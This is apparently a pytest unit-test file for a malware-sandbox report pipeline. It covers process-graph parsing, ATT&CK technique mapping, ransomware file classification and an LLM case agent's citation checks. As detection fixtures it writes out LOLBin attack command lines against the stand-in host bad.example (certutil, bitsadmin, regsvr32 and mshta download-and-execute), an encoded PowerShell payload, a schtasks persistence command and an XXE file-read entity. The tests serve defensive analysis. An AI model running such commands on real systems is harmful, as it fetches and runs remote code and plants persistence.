"""Conservative boundaries for graph identity, derived claims and read-only agent tools."""
import base64
import copy
import json

import pytest

from anyrun_public_report import _public_vue_data_to_anyrun_report
from analysis_pipeline import build_behavior, run_pipeline, research_markdown
from case_agent import CaseTools, validate_assessment, baseline_assessment
from deep_analysis import (analyze_command, build_deep_analysis, classify_file, compare_family,
                           enrich_mappings, family_catalog, path_key, deep_report_lines)
from evidence import collect_evidence, validate_bundle, resolve_pointer
from mitre_mapping import map_evidence
from report_context import graph_context
from test_public_report_context import VUE, UUID, process

pytestmark = pytest.mark.unit
PARENT = '11111111-1111-4111-8111-111111111111'
CHILD = '22222222-2222-4222-8222-222222222222'


def edge(parent=PARENT, child=CHILD, dashed=False):
    return '<g class="edge"><title>NODE_' + parent.replace('-', '_') + ':e-&gt;NODE_' + child.replace('-', '_') + ':w</title><path' + (' stroke-dasharray="1,5"' if dashed else '') + '/></g>'


def sample(graph=None):
    data = copy.deepcopy(VUE)
    a = process(10, r'dropper.exe', r'C:\Users\u\dropper.exe', 'explorer.exe')
    b = process(11, r'certutil.exe -urlcache -split -f https://bad.example/a.exe C:\Temp\a.exe', r'C:\Windows\System32\certutil.exe', 'wrong.exe')
    a['rowId'], b['rowId'] = PARENT, CHILD
    a['rowData']['pid'], b['rowData']['pid'] = 10, 11
    a['rowData']['information']['modules'] = [[r'C:\Windows\mscoree.dll'], [r'C:\Windows\clr.dll'], [r'C:\Windows\vaultcli.dll'], [r'C:\Windows\advapi32.dll']]
    data['processes'] = {'processesValues': [a, b], 'graphSvg': graph if graph is not None else '<svg>'+edge()+'</svg>'}
    data['filesActivity'] = {'droppedFiles': [{'pid': 10, 'filename': r'C:\Windows\System32\certutil.exe', 'type': {'value':'executable'}}]}
    data['general']['rawAnalysisDate'] = 1747683227686
    data['staticInformation'] = {'exif': [['EXE', [['TimeStamp', '2042:03:27 06:25:13+00:00']]]], 'trid': [{'extension':'.exe','value':'Win32 executable (85)'}]}
    return data


def parsed(data=None):
    report = _public_vue_data_to_anyrun_report(data or sample(), UUID)
    bundle = collect_evidence(report, {})
    mappings, _ = map_evidence(bundle)
    deep = build_deep_analysis(report, bundle, mappings, {'threat_name':'WannaCry'})
    return report, bundle, mappings, deep


def test_uuid_edge_overrides_wrong_parent_name_and_binds_source():
    report,bundle,_,deep=parsed()
    child=report['data']['content']['processes'][1]
    assert child['ppid']==10 and child['parentUuid']==PARENT and child['ppidBasis']=='graph_uuid'
    validate_bundle(bundle)
    story=deep['process_story']['processes'][1]
    assert story['parent']['basis']=='graph_uuid' and len(story['parent']['evidence_ids'])==3
    relation=next(e for e in bundle['evidence'] if e['type']=='process_relation')
    assert resolve_pointer(report,relation['source_path'])==relation['value']
    assert any(e.get('parent_basis')=='graph_uuid' for e in build_behavior(bundle)['relations'])


@pytest.mark.parametrize('graph',[ '<svg>'+edge(dashed=True)+'</svg>', '<svg>'+edge(CHILD,PARENT)+edge()+'</svg>',
    '<svg>'+edge('33333333-3333-4333-8333-333333333333')+'</svg>', '<svg>broken',
    '<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///private">]><svg/>'])
def test_uncertain_or_malformed_graph_never_becomes_reported_parent(graph):
    report,_,_,_=parsed(sample(graph))
    assert not report['data']['content']['processRelations']
    assert all(p.get('ppidBasis')!='graph_uuid' for p in report['data']['content']['processes'])


def test_two_parents_duplicate_uuid_and_start_timestamp():
    rows=[{'uuid':PARENT,'pid':10},{'uuid':CHILD,'pid':11},{'uuid':'33333333-3333-4333-8333-333333333333','pid':12}]
    g='<svg>'+edge()+edge(rows[2]['uuid'])+'</svg>'
    assert not graph_context({'graphSvg':g},rows)['relations']
    assert not graph_context({'graphSvg':'<svg>'+edge()+'</svg>'},rows+[dict(rows[0])])['relations']
    node=f'<g class="node" id="{CHILD}|11|1747683233620"><title>NODE_{CHILD.replace("-","_")}</title></g>'
    graph_context({'graphSvg':'<svg>'+node+edge()+'</svg>'},rows)
    assert rows[1]['startTime']==1747683233620
    bad_node=node.replace('|11|','|999|')
    assert not graph_context({'graphSvg':'<svg>'+bad_node+edge()+'</svg>'},rows)['relations']


def test_pid_reuse_does_not_attach_network_artifact_to_wrong_process():
    data=sample();data['processes']['processesValues'][1]['rowData']['values'][0]=10
    data['processes']['processesValues'][1]['rowData']['pid']=10
    data['processes']['processesValues'][1]['pid']=10
    data['networkActivity']['connections'][0][0]=10
    _,bundle,_,deep=parsed(data)
    assert not [a for p in deep['process_story']['processes'] for a in p['artifacts'] if a['type']=='ip']
    assert not [r for r in build_behavior(bundle)['relations'] if r['relation']=='reported_process_artifact' and r['target'] in {e['id'] for e in bundle['evidence'] if e['type']=='ip'}]


def test_drop_execute_matching_is_case_insensitive_but_not_basename_guess():
    report,_,_,deep=parsed()
    assert len(deep['process_story']['drop_execute'])==1
    row=deep['process_story']['drop_execute'][0]
    assert row['chronology']=='not_proven' and row['writer_is_graph_parent']
    data=sample();data['filesActivity']['droppedFiles'][0]['filename']=r'C:\Other\certutil.exe'
    assert parsed(data)[3]['process_story']['drop_execute']==[]
    assert path_key(r'\??\C:\TEMP\a.exe')==path_key(r'c:/temp/a.exe')


@pytest.mark.parametrize('path,expected',[(r'a.doc.WNCRY','encrypted_file'),('readme.txt','ransom_note'),
    (r'msg\m_en.wnry','language_resource'),('c.wnry','family_resource_candidate'),('a.ps1','script'),
    ('a.exe','executable_candidate'),('a.wncryt','temporary'),('photo.jpg','other')])
def test_file_classification(path,expected):
    assert classify_file(path)==expected


@pytest.mark.parametrize('name,command,tid',[
 ('certutil.exe','cert^util -urlcache https://bad.example/a.exe','T1105'),
 ('bitsadmin.exe','bitsadmin /transfer job https://bad.example/a.exe C:\\a.exe','T1197'),
 ('mshta.exe','mshta javascript:alert(1)','T1218.005'),
 ('rundll32.exe','rundll32 C:\\a.dll,Entry','T1218.011'),
 ('regsvr32.exe','regsvr32 /i:https://bad.example scrobj.dll','T1218.010'),
 ('wmic.exe','wmic process call create a.exe','T1047'),
 ('cscript.exe','cscript //nologo a.vbs','T1059.005'),
 ('cscript.exe','cscript //nologo a.js','T1059.007')])
def test_lolbin_requires_behavior_arguments(name,command,tid):
    result=analyze_command(command,name)
    assert result['findings'][0]['technique_id']==tid
    assert analyze_command(name+' /?',name)['findings']==[]


def test_powershell_decode_literal_folding_and_host_variables_never_execute(monkeypatch):
    monkeypatch.setenv('SECRET','never-expose')
    content='Write-Output ("https://" + "bad.example/a.exe"); $env:SECRET'
    encoded=base64.b64encode(content.encode('utf-16-le')).decode()
    result=analyze_command('powershell -enc '+encoded,'powershell.exe')
    assert result['decoded_powershell']==content and 'never-expose' not in json.dumps(result)
    assert analyze_command('powershell ("https://" + "bad.example/a.exe")','powershell.exe')['urls']==['https://bad.example/a.exe']
    assert analyze_command('cscript -enc '+encoded,'cscript.exe')['decoded_powershell']==''


def test_static_clues_are_scoped_and_do_not_assert_timestomp_or_unsigned():
    _,bundle,_,deep=parsed();p=deep['static_profile']
    assert p['findings'][0]['kind']=='future_pe_timestamp' and p['findings'][0]['not_conclusive_for']=='timestomping'
    assert p['signature']['status']=='not_reported'
    assert p['runtime'][0]['scope']=='process_not_necessarily_main_container'
    assert p['dll_capabilities'][0]['confidence']=='low' and len(p['dll_capabilities'])==1
    assert not {'module','pe_metadata','file_type','process_relation'} & {o['type'] for o in bundle['observables']}
    assert not {'T1070.006','T1555'} & {f.get('technique_id') for f in p['dll_capabilities']+p['findings']}


@pytest.mark.parametrize('status',['unsigned','untrusted','trusted'])
def test_explicit_signature_is_source_reported_only(status):
    data=sample();data['staticInformation']['signature']={'status':status}
    p=parsed(data)[3]['static_profile'];assert p['signature']['status']=='reported_'+status
    assert p['signature']['evidence_ids']


def test_missing_analysis_date_does_not_compare_pe_time_against_wall_clock():
    data=sample();data['general'].pop('rawAnalysisDate')
    assert not parsed(data)[3]['static_profile']['findings']


def test_unicode_alone_is_not_masquerading_technique():
    data=sample();p=data['processes']['processesValues'][1];p['rowData']['values'][2]=r'C:\Temp\文件.exe';p['fileName']='文件.exe'
    story=parsed(data)[3]['process_story']['processes'][1]
    assert story['flags'][0]['confidence']=='low' and 'technique_id' not in story['flags'][0]
    data['processes']['processesValues'][1]['rowData']['values'][2]=r'C:\Windows\exploer.exe'
    assert parsed(data)[3]['process_story']['processes'][1]['flags'][0]['technique_id']=='T1036'


def test_family_baseline_never_invents_case_evidence_or_variant():
    _,_,mappings,deep=parsed();family=deep['family_expectations']
    assert family['family']=='WannaCry' and family['software_id']=='S0366'
    assert all(r['evidence_ids']==[] for r in family['not_observed'])
    assert family_catalog()['families']['RedLine Stealer']['software_id'].startswith('S')
    assert not compare_family({'threat_name':'new-unknown-family'},mappings)['found']


def test_new_tools_bind_only_sources_returned_and_narrative_rejects_unread():
    report,bundle,mappings,deep=parsed()
    tools=CaseTools(bundle,build_behavior(bundle),mappings,[],{},deep=deep)
    result=tools.run('get_process_story',{'limit':1})
    assert result['analysis']['total']==2
    assert tools.seen=={e['id'] for e in result['evidence']}
    tools.run('get_static_profile',{});family=tools.run('get_family_expectations',{})
    assert family['analysis']['assessment_status']=='family_reference'
    base=baseline_assessment(tools);base['attack_narrative']=[{'text':'Có dấu vết tiến trình.','evidence_ids':['ev-fake'],'assessment_status':'observed'}]
    # Invented or unread citations drop the sentence; they never reach the result.
    assert validate_assessment(base,tools)['narrative_dropped']==1
    base['attack_narrative'][0]['evidence_ids']=[bundle['evidence'][0]['id']]
    tools.seen.discard(bundle['evidence'][0]['id'])
    assert validate_assessment(base,tools)['attack_narrative']==[]
    tools.run('get_evidence',{'evidence_ids':base['attack_narrative'][0]['evidence_ids']})
    assert validate_assessment(base,tools)['attack_narrative']


def test_pipeline_and_exports_include_all_new_context():
    report,_,_,_=parsed();result,playbook=run_pipeline(report,{},source='demo:test')
    payload={**result.research,'playbook':{'actions':[]}}
    assert payload['case_agent']['assessment']['attack_narrative']
    assert any('ATT&CK' in line for line in deep_report_lines(payload))
    assert 'Phân tích sâu' in research_markdown(payload)
    assert not any(t['tool']=='get_process_story' for t in result.research['case_agent']['tool_trace'])  # rules are not LLM


def test_drop_timing_requires_both_source_timestamps():
    data=sample();stamp=1747683233620
    node=f'<g class="node" id="{CHILD}|11|{stamp}"><title>NODE_{CHILD.replace("-","_")}</title></g>'
    data['processes']['graphSvg']='<svg>'+node+edge()+'</svg>'
    data['filesActivity']['droppedFiles'][0]['timestamp']=stamp-2000
    row=parsed(data)[3]['process_story']['drop_execute'][0]
    assert row['chronology']=='source_times_compatible' and row['near_in_time'] and row['seconds_between_source_times']==2
    data['filesActivity']['droppedFiles'][0]['timestamp']=stamp+2000
    row=parsed(data)[3]['process_story']['drop_execute'][0]
    assert row['chronology']=='source_times_conflict' and not row['near_in_time']


def test_loader_and_persistence_roles_are_hypotheses():
    data=sample();p=data['processes']['processesValues'][1];p['rowData']['values'][1]=r'rundll32 C:\a.dll,Entry';p['fileName']='rundll32.exe'
    assert any(r['role']=='loader_candidate' and r['assessment_status']=='inference' for r in parsed(data)[3]['process_story']['processes'][1]['roles'])
    p['fileName']='schtasks.exe';p['rowData']['values'][1]='schtasks /Create /TN Updater /TR bad.exe /SC ONLOGON'
    assert any(r['role']=='persistence_candidate' for r in parsed(data)[3]['process_story']['processes'][1]['roles'])


def test_llm_orchestration_uses_new_tools_and_cites_read_source(monkeypatch):
    from case_agent import investigate_case
    report,bundle,mappings,deep=parsed()
    target=next(e['id'] for e in bundle['evidence'] if e['type']=='process')
    script=iter([{'tool':'get_process_story','args':{'limit':1}}, {'tool':'get_static_profile','args':{}},
                 {'tool':'get_family_expectations','args':{}}, {'tool':'get_evidence','args':{'evidence_ids':[target]}},
                 {'tool':'submit_assessment','args':{'assessment':{
                     'summary':'Cần đối chiếu tiến trình trên endpoint.',
                     'impact':{'severity':'unknown','summary':'Chưa đủ dữ liệu tác động.','evidence_ids':[]},
                     'behavior_chain':[],'action_plan':[],'open_questions':[],
                     'attack_narrative':[{'text':'Nguồn ghi nhận tiến trình mẫu.','evidence_ids':[target],'assessment_status':'observed'}]}}}])
    monkeypatch.setenv('AGENT_PROVIDER','deepseek');monkeypatch.setattr('case_agent._call_model',lambda *_:next(script))
    result=investigate_case(bundle,build_behavior(bundle),mappings,[],{},deep=deep)
    assert result['mode']=='llm' and result['assessment']['attack_narrative'][0]['evidence_ids']==[target]
    assert [r['tool'] for r in result['tool_trace']][:3]==['get_process_story','get_static_profile','get_family_expectations']


def test_chat_context_uses_deep_clues_without_dumping_module_lists():
    from ai_assistant import _build_context
    report,_,_,_=parsed();result,plan=run_pipeline(report,{},source='demo:test')
    from reporter import _report_payload
    payload=_report_payload(result,plan)
    payload['processes']['list'][0]['modules']=['DO_NOT_DUMP_RAW_MODULE_LIST']*1000
    context=_build_context(payload)
    assert 'DO_NOT_DUMP_RAW_MODULE_LIST' not in context
    assert 'future_pe_timestamp' in context and 'not_observed' in context


def test_source_row_cut_by_tool_budget_is_not_counted_as_read():
    from case_agent import _visible_source_ids
    row={'id':'ev-example','type':'process','source_path':'/data/content/processes/0/name','value':'a.exe','context':'x'*1000}
    result={'evidence':[row]}
    wire=json.dumps(result,ensure_ascii=False)
    assert _visible_source_ids(result,wire)=={'ev-example'}
    assert _visible_source_ids(result,wire[:200])==set()


def test_yara_capability_and_certificate_alert_stay_signatures_not_events():
    data=sample();data['general']['tags']=['redline'];data['general']['threats']=[{'title':'RedLine Stealer'}]
    data['behaviorActivities']=[{'name':'MALICIOUS','values':[
        {'name':'There is functionality for taking screenshot (YARA)','values':['dropper.exe (PID: 10)']},
        {'name':'Executing a file with an untrusted certificate','values':['dropper.exe (PID: 10)']}]}]
    _,bundle,mappings,deep=parsed(data)
    screenshot=next(m for m in mappings if m['technique_id']=='T1113')
    assert screenshot['assessment_status']=='hypothesis' and screenshot['origin']=='behavior_signature_hypothesis'
    assert next(f for f in deep['static_profile']['findings'] if f['kind']=='untrusted_certificate_signature')['assessment_status']=='signature'
    assert deep['static_profile']['signature']['status']=='not_reported'


def test_only_notable_modules_are_kept_with_a_count():
    from anyrun_public_report import _modules
    row = {'information': {'modules': [[r'C:\Windows\System32\advapi32.dll'], [r'C:\Windows\System32\MSCOREE.DLL'],
                                       [r'C:\Windows\System32\bcrypt.dll'], [r'C:\Windows\System32\vaultcli.dll']]}}
    assert _modules(row) == {'modules': [r'C:\Windows\System32\MSCOREE.DLL', r'C:\Windows\System32\vaultcli.dll'], 'moduleCount': 4}


def test_encryption_marker_comes_from_the_case_not_a_family_list():
    assert classify_file(r'C:\Users\a\report.docx.LOCKED', markers={'locked'}) == 'encrypted_file'
    assert classify_file(r'C:\Users\a\report.docx.WNCRY', markers=set()) == 'other'
